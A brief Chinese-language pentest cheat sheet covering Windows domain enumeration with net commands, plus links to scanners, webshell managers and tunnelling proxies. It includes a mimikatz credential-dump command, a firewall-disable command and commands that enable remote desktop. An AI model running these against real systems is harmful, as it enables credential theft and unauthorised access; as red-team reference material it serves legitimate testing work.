# 一些小记


## 一些命令

### 域基础收集

```shell
net view                 # 查看局域网内其他主机名
net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
net user                 # 查看本机用户列表
net user /domain         # 查看域用户
net localgroup administrators # 查看本地管理员组（通常会有域用户）
net view /domain         # 查看有几个域
net user 用户名 /domain   # 获取指定域用户的信息
net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
net group 组名 /domain    # 查看域中某工作组
net group "domain admins" /domain  # 查看域管理员的名字
net group "domain computers" /domain  # 查看域中的其他主机名
net group "doamin controllers" /domain  # 查看域控制器主机名（可能有多台）
```

mimikatz

```shell
mimikatz_x64.exe "log" "privilege::debug" "sekurlsa::logonpasswords" exit 
```


### 杂项

关闭防火墙：`netsh advfirewall set allprofiles state off`

添加远程桌面

```shell
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v portnumber /d 3389 /f
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
netstat -an|find "3389"
```

## 一些工具



### 子域名收集
- [fofa](https://fofa.info/)
- [securitytrails api](https://securitytrails.com)
- otx.alienvault.com/api/v1/indicators/domain/{domain}/url_list?limit=100&page=1

### 扫描工具
- [fscan](https://github.com/shadow1ng/fscan)
- [kscan](https://github.com/lcvvvv/kscan)

### 管理工具
- [vshell](https://github.com/veo/vshell)
- [antsword](https://github.com/AntSwordProject/antSword)
- [Venom 多级代理](https://github.com/Dliv3/Venom)
- [Stowaway 多级代理](https://github.com/ph4ntonn/Stowaway)
- [Fuso 内网穿透](https://github.com/editso/fuso)
- [红/蓝队环境自动化部署工具](https://github.com/ffffffff0x/f8x)



## 文档查阅
- 工具使用
  - mimikatz: [一](https://paper.seebug.org/1669/), [二](https://paper.seebug.org/1672/)

